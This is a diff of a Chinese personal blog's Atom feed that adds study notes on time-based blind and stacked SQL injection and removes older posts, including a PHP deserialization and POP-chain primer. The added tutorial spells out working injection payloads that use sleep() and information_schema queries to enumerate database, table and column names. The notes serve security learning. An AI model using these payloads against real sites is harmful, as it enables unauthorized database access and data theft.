@@ -6,7 +6,7 @@
   <link href="https://liu1272.github.io/atom.xml" rel="self"/>
   
   <link href="https://liu1272.github.io/"/>
-  <updated>2023-03-12T04:15:17.647Z</updated>
+  <updated>2023-03-12T16:42:47.537Z</updated>
   <id>https://liu1272.github.io/</id>
   
   <author>
@@ -15,6 +15,54 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SQL二次注入</title>
+    <link href="https://liu1272.github.io/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+    <id>https://liu1272.github.io/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
+    <published>2023-03-12T16:15:00.000Z</published>
+    <updated>2023-03-12T16:42:47.537Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h3>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;未完待续…&quot;&gt;&lt;a href=&quot;#未完待续…&quot; class=&quot;headerlink&quot; title=&quot;未完待续…&quot;&gt;&lt;/a&gt;未完待续…&lt;/h3&gt;</summary>
+      
+    
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL时间注入&amp;堆叠注入</title>
+    <link href="https://liu1272.github.io/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/"/>
+    <id>https://liu1272.github.io/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/</id>
+    <published>2023-03-12T15:11:00.000Z</published>
+    <updated>2023-03-12T16:41:31.525Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="SQL时间注入"><a href="#SQL时间注入" class="headerlink" title="SQL时间注入"></a>SQL时间注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>无论输入什么都会返回正常的处理信息或者页面无回显<br>能依靠自身感知到页面的延时情况</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>前端在将数据传给后台时，设置了一个if语句<br>当条件为真时执行sleep语句，条件为假时无执行语句</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>时间注入又称延时注入，与布尔盲注同属于盲注无回显的类型。<br>如果想要注入，必不可少的是得看得到效果。<br>那么有没有什么方法能直接或是间接地显示或猜解出数据呢？<br>当然有！前面就已近提到过函数这个东西了。<br>函数与and结合时，如果传入的参数正确就会触发函数，否则不执行。<br>此时将函数与查询语句结合后再与传入的参数结合就能达到最终效果了。</p><h4 id="相关函数讲解"><a href="#相关函数讲解" class="headerlink" title="相关函数讲解"></a>相关函数讲解</h4><pre><code>if(a,b,c)                如果a是TRUE(a!=0或a!=NULL)，则返回b，否则返回csleep(x)                 延时x秒if(a,b,c)                a为真，执行b；否则执行cbenchmark(a,b)           a为操作次数，b为执行的函数                         原理是通过多次操作，让极短暂的延时增加到能识别的程度                         后面几个都是这种思想笛卡尔积                  别问，老子离散数学还没学到这！get_lock(key, timeout)   key(最好是数字)指定名称获取锁，timeout指定锁定时间                         前提条件是数据库连接是长连接正则bug                  利用大量正则计算延长时间，实现延时除此之外还有case … when … then … else … end</code></pre><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入点及注入的类型"><a href="#判断是否存在注入点及注入的类型" class="headerlink" title="判断是否存在注入点及注入的类型"></a>判断是否存在注入点及注入的类型</h5><pre><code>?id=1?id=5?id=5&#39;?id=5&quot;?id=5 and 1=1?id=5 and 1=2</code></pre><p>如果页面显示结果一样，那就说明可能是延时注入</p><h5 id="获取库长度"><a href="#获取库长度" class="headerlink" title="获取库长度"></a>获取库长度</h5><pre><code>?id=1 and if(length(database())&lt;10,sleep(5),1)?id=1 and if(length(database())=4,sleep(5),1)</code></pre><p>如果第一个没有延时，但是第二个有5秒延时则表名数据库名长度为4</p><h5 id="获取库名、表名、字段名及字段内容"><a href="#获取库名、表名、字段名及字段内容" class="headerlink" title="获取库名、表名、字段名及字段内容"></a>获取库名、表名、字段名及字段内容</h5><pre><code>爆数据库名?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)测试表数量?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;5测试第一张表长度?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;10测试表名?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100测试表中字段数量?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=5测试字段内容?id=1 and (select count(name) from users)=4</code></pre><p>这时候你会发现这就是布尔盲注的做法<br>一个一个跑咯，懒得细细讲解了</p><h3 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h3><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><p>跟联合查询注入差不多，两个方式相应的真假值都有不同的回显。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在SQL中，分号表示一条 sql 语句的结束。<br>在分号后继续构造下一条语句，就会把两条语句一起执行。<br><strong>联合注入</strong>也是将两条语句合并在一起，两者之间有什么区别么？<br>union执行的语句类型是有限的，而堆叠注入可以执行任意语句。</p><h4 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="检查注入点及回显位"><a href="#检查注入点及回显位" class="headerlink" title="检查注入点及回显位"></a>检查注入点及回显位</h5><pre><code>?id=1&#39;?id=1&#39; and 1=1--+?id=1&#39; and 1=2--+</code></pre><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>方法前面都有讲，回去抄payload就行了<br>加入分号，再接一个SQL语句看是否能显出结果。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>今天不讲一句，讲一段话。</p><p><strong>人像摄影，更强调人物本身的特点，仿佛这个人就在你面前一样。<br>但是每个人不同的身高决定了站立时必定不能拍出完美的图片。<br>因此，拍人像时，最简单的一个办法就是用跟他们同样的视角拍摄，<br>这样才能看见他们更多的表情、神态和动作。<br>你才能看到他们的世界，画面才会更有吸引力。</strong></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;SQL时间注入&quot;&gt;&lt;a href=&quot;#SQL时间注入&quot; class=&quot;headerlink&quot; title=&quot;SQL时间注入&quot;&gt;&lt;/a&gt;SQL时间注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
+      
+    
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>SQL报错注入</title>
@@ -439,55 +487,6 @@
       
       
     <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h5 id=&quot;图床的创建&quot;&gt;&lt;a href=&quot;#图床的创建&quot; class=&quot;headerlink&quot; title=&quot;图床的创建&quot;&gt;</summary>
-      
-    
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2022年度总结</title>
-    <link href="https://liu1272.github.io/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
-    <id>https://liu1272.github.io/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
-    <published>2022-12-31T11:46:00.000Z</published>
-    <updated>2023-01-04T11:28:04.788Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="呆"><a href="#呆" class="headerlink" title="呆~"></a>呆~</h4><p>  简直突如其来呐。<br>  万万没想到一个月就过去了，时间过得真快啊。</p><p>  在2022年的抗疫决赛圈，几乎所有人都成了小阳人，其中也包括我。<br>  发烧第一天真的是给我吓到了，中午一觉起来高烧42.5℃，惊恐之余赶紧撑着摇摇欲坠的身体去买布洛芬(似乎我这个城市退烧药还算充足？)到晚上睡前才降到39℃。看到那个长度我真的是笑希了，感觉39℃也不过是小问题……<br>  (⁄ ⁄•⁄ω⁄•⁄ ⁄)<br>  感谢芙灵和一个现在被迫带烧返校的可怜的江苏高三Dog!<br>  现在病情已经到了欲说还休的阶段了，因此被鹅鸭杀劝退<del>，因此才能闲到来写这个文章</del><br>  希望早日康复吧，我还想吃正新鸡排</p><p>  这个小小站点活过了第一个国庆，第一个圣诞，马上就是元旦和春节了，希望这里能永远保存下去。<br>  最近了解了GitHub Arctic Code Vault这个东东，虽然说想得到这个可能有点不现实，但是可以把它当作理想吧。<br>  (づ ●─● )づ</p><p>  对于2023年的规划没有太多的变化，仍然是多学习，多看世界，多保重身体。<br>  人生刚刚开始，未来可期。<br>  犹豫不决的时候不要问别人，问自己。听别人的如果后悔了，是要后悔两次的。</p><p>  最后，元旦快乐~</p><p>  乾杯 []~ （￣▽￣） ~*</p><h5 id="20230104补档"><a href="#20230104补档" class="headerlink" title="20230104补档"></a>20230104补档</h5><p>  <strong>试验阿里云+PicGo图床</strong><br>   <img src="https://liuguobin-blog.oss-cn-hongkong.aliyuncs.com/base.png#pic_center" width="300"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h4 id=&quot;呆&quot;&gt;&lt;a href=&quot;#呆&quot; class=&quot;headerlink&quot; title=&quot;呆~&quot;&gt;&lt;/a&gt;呆~&lt;/h4&gt;&lt;p&gt;  简直突如其来呐。&lt;br&gt;  万万没想到一个月就过去了，时间过得真快啊。&lt;/p&gt;
-&lt;p&gt;  在2022年的抗疫决赛圈，几乎所有人都成了小阳人，</summary>
-      
-    
-    
-    
-    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
-    
-    
-    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PHP序列化及常见魔术方法</title>
-    <link href="https://liu1272.github.io/2022/12/04/20221204/"/>
-    <id>https://liu1272.github.io/2022/12/04/20221204/</id>
-    <published>2022-12-04T13:59:00.000Z</published>
-    <updated>2023-03-03T11:33:39.458Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><pre><code>【数组序列化】&lt;?php$a=null;echo serialize($a);?&gt;a:参数数量:&#123;i:0;s:字符串长度:&quot;字符串&quot;;&#125;$a=null;         N;$b=123456;       i:123456;$c=1.2;          d:1.2;$d=true;         b:1;$e=false;        b:0;$f=&#39;benben&#39;;     s:长度:字符串;【对象序列化】&lt;?phpclass lei&#123;    public $chengyuan=&#39;zifuchuan&#39;;    function hanshu()&#123;        echo $this-&gt;chengyuan;    &#125;&#125;$a=new lei();echo serialize($a);echo urlencode(serialize($a));?&gt;O:类名长度:&quot;类名&quot;:1:&#123;s:成员长度:&quot;成员名&quot;;s:值长度:&quot;值&quot;;&#125;修饰符public公有，private私有私有的成员属性要在前后都加上二进制的%00,在urlencode时可以看见【对象序列化的嵌套】&lt;?phpclass test&#123;    public $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;class test2&#123;    var $ben;&#125;$b=new test();$a=new test2();$a-&gt;ben=$b;echo serialize($a);?&gt;O:5:&quot;test2&quot;:1:&#123;s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;&#125;当在对象内调用对象时，会出现嵌套:实例化后的对象$a的成员变量&#39;ben&#39;调用实例化后的对象$b</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>1.反序列化后的内容为一个对象，与序列化相反<br>2.反序列化生成的对象内的值，由反序列化里的值提供，与原有类预定义的值无关<br>3.反序列化不触发类的成员方法，需要调用方法之后才能触发</p><pre><code>&lt;?phpclass test&#123;    public $a=&#39;benben&#39;;    protected $b=666;    private $c=false;    public function displayVar()&#123;        echo $this-&gt;a;    &#125;&#125;$d=new test();$d=serialize($d);echo urlencode($d);$a=urlencode($d);$b=unserialize(urldecode($a));$b-&gt;displayVar();var_dump($b);?&gt;benbenobject(test)#1 (3) &#123;  [&quot;a&quot;]=&gt;  string(6) &quot;benben&quot;  [&quot;b&quot;:protected]=&gt;  int(666)  [&quot;c&quot;:&quot;test&quot;:private]=&gt;  bool(false)&#125;</code></pre><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>概念:<br>预定好的，在特定的情况下处罚的行为方法。<br>反序列化成因(作用):<br>反序列化过程中unserizlize()接收的值(字符串)可控；<br>通过更改这个值(字符串)，所得到的代码；<br>通过调用方法，触发代码执行。<br>相关机制:<br>触发时机(先决条件)-&gt;功能(最重要)-&gt;参数(尤其是pop链)-&gt;返回值<br>详解:</p><pre><code>1.__construct()构造函数在实例化对象时，自动执行的方法只有当new时触发，不需要特地调用2.__destruct()析构函数在对象的所有引用都被删除或者对象被显式销毁时才触发new和unserialize之后会触发3.__sleep()清理对象可以传入成员属性，serialize之前触发并返回一个包含对象中所有需要被序列化的变量名称的数组如果无返回则NULL被序列化，产生E_NOTICE错误4.__wakeup()预先准备对象资源，返回void在unserialize前触发5.__tostring()表达方式错误把对象当成字符串调用时触发，如echo，print6.__invoke()格式表达错误把对象当成函数调用时触发，如echo $a() -&gt; hanshu7.__call()不存在方法不存在调用的方法时触发8.__callStatic()不存在方法静态调用或调用成员常量不存在时使用9.__get()不存在方法检查成员属性是否存在10.__set()不存在方法给不存在的成员属性赋值时触发11.__isset()或__empty()或__unset()不可访问对不可访问的属性访问时会触发如protect属性(不可读)或根本不存在的属性12.__clone()复制使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</code></pre><p>注意:<br>1.只有该类或对象包含了该魔术方法才能被使用或触发<br>2.先分析尾部代码看看有什么执行的步骤<br>3.接着从触发的方法及其顺序判断漏洞的利用地点<br>4.最后构造playload<br>5.比较长的代码建议使用反推法进行分析<br>6.一定要先实例化(new)</p><h4 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h4><p>反序列化中成员变量可以被控制，使用有一种漏洞叫面向属性编程(POP)<br>POP链是利用魔术方法在里面多次跳转然后获取敏感信息的一种playload</p><h4 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h4><p>概念验证(POC)是漏洞验证程序，只是为了证明提出者观点的一段代码</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;序列化&quot;&gt;&lt;a href=&quot;#序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化&quot;&gt;&lt;/a&gt;序列</summary>
       
     
     
